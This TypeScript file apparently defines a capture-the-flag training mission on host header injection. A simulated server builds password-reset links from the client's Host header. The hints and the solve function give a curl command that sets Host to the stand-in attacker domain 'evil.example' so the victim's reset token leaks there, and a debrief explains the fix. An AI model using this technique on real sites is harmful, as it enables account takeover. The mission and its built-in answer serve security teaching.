/**
 * Host header injection, simulated. The toy server builds a password-reset link
 * from the `Host` header the client sent, so pointing `Host` at your own domain
 * makes the reset link, and the token in it, come to you. The fix, in the
 * debrief: build absolute URLs from a configured domain, never from the request.
 */
import { flagFrom, submitted, type Mission } from "../kit";
import { attackBox, ok, notFound } from "./kit";
import type { Site } from "@/lib/shell/http";

export const HOST: Mission[] = [
  {
    id: "break-host-1",
    title: "Poison the reset link",
    brief:
      "`account.lab/reset` sends a password-reset link, and it builds that link from the `Host` header of your request: `https://<Host>/reset?token=...`. Set the Host to a domain you control, so the victim's link, and its token, point at you.",
    greeting: "The Host header is sent by the client. If the server builds links from it, you choose where those links go.",
    hints: [
      "`-H` sets a header. Send `Host: evil.example` with your request.",
      "The server will spell out where the poisoned link, and its token, went.",
      "`curl -s -H 'Host: evil.example' account.lab/reset -d 'email=victim@corp'`",
    ],
    build: (rng) => {
      const flag = flagFrom(rng);
      const site: Site = (r) => {
        if (r.path !== "/reset") return notFound;
        const host = r.headers.host ?? "account.lab";
        if (host === "account.lab") return ok("A reset link was sent to the user's inbox.\n");
        return ok(`Reset link built as https://${host}/reset?token=${flag} and emailed to the victim. When they click it, ${host} receives the token: ${flag}\n`);
      };
      return { shell: attackBox({ "account.lab": site }), flag };
    },
    passed: submitted,
    solve: (w) => [`curl -s -H 'Host: evil.example' account.lab/reset -d 'email=victim@corp'`, `submit ${w.flag}`],
    notEnough: () => [`curl -s account.lab/reset -d 'email=victim@corp'`],
    debrief:
      "The link trusted a header the attacker controls, so the reset token walked straight to the attacker's domain. Build absolute links from a server-side configured hostname, and validate the incoming Host against an allowlist so a forged one is rejected.",
  },
];
